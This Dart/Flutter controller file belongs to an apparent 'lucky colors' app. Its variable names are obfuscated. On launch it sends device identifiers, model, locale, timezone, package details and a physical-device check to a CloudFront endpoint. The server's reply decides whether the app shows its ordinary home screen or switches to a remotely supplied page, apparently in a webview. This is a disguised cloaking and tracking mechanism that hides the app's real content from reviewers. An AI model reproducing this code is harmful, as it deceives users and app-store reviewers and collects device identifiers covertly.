import 'dart:io';

import 'package:get/get.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';

import 'package:device_info_plus/device_info_plus.dart';

class LuckyColorsInitLogic extends GetxController {

  var rhpixle = RxBool(false);
  var nkaclxhd = RxBool(true);
  var mvdixec = RxString("");
  var heber = RxBool(false);
  var haag = RxBool(true);
  final zbgnlkh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    vkmype();
  }


  Future<void> vkmype() async {
    heber.value = true;
    haag.value = true;
    nkaclxhd.value = false;

    zbgnlkh.post("https://d20qt7w6kqkjbw.cloudfront.net/SX4stHvMY2Ed",data: await magcrdnbu()).then((value) {
      var qduacplv = value.data["qduacplv"] as String;
      var sjeznr = value.data["sjeznr"] as bool;
      if (sjeznr) {
        mvdixec.value = qduacplv;
        bria();
      } else {
        dooley();
      }
    }).catchError((e) {
      nkaclxhd.value = true;
      haag.value = true;
      heber.value = false;
    });
  }

  Future<Map<String, dynamic>> magcrdnbu() async {
    final DeviceInfoPlugin qipt = DeviceInfoPlugin();
    PackageInfo eavzb_qxjv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var edun = Platform.localeName;
    var STrdCkt = currentTimeZone;

    var Nmui = eavzb_qxjv.packageName;
    var ctoNFDIV = eavzb_qxjv.version;
    var ZvCodIb = eavzb_qxjv.buildNumber;

    var pMsg = eavzb_qxjv.appName;
    var dSfGeC = "";
    var SPTaoHW  = "";
    var fyTerFv = "";
    var heatherGleichner = "";
    var betsyBeatty = "";
    var caterinaLuettgen = "";
    var jalonQuitzon = "";
    var griffinBernhard = "";
    var mitchellJohnston = "";
    var adamCassin = "";


    var gKLRiJvw = "";
    var LTFGPd = false;

    if (GetPlatform.isAndroid) {
      gKLRiJvw = "android";
      var bsgvezconx = await qipt.androidInfo;

      fyTerFv = bsgvezconx.brand;

      dSfGeC  = bsgvezconx.model;
      SPTaoHW = bsgvezconx.id;

      LTFGPd = bsgvezconx.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      gKLRiJvw = "ios";
      var zqpeiwuyfr = await qipt.iosInfo;
      fyTerFv = zqpeiwuyfr.name;
      dSfGeC = zqpeiwuyfr.model;

      SPTaoHW = zqpeiwuyfr.identifierForVendor ?? "";
      LTFGPd  = zqpeiwuyfr.isPhysicalDevice;
    }
    var res = {
      "ZvCodIb": ZvCodIb,
      "ctoNFDIV": ctoNFDIV,
      "Nmui": Nmui,
      "dSfGeC": dSfGeC,
      "griffinBernhard" : griffinBernhard,
      "STrdCkt": STrdCkt,
      "fyTerFv": fyTerFv,
      "jalonQuitzon" : jalonQuitzon,
      "SPTaoHW": SPTaoHW,
      "edun": edun,
      "gKLRiJvw": gKLRiJvw,
      "LTFGPd": LTFGPd,
      "heatherGleichner" : heatherGleichner,
      "pMsg": pMsg,
      "betsyBeatty" : betsyBeatty,
      "caterinaLuettgen" : caterinaLuettgen,
      "mitchellJohnston" : mitchellJohnston,
      "adamCassin" : adamCassin,

    };
    return res;
  }

  Future<void> dooley() async {
    Get.offNamed("/luckyColorsHome");
  }

  Future<void> bria() async {
    Get.offNamed("/select_color");
  }

}
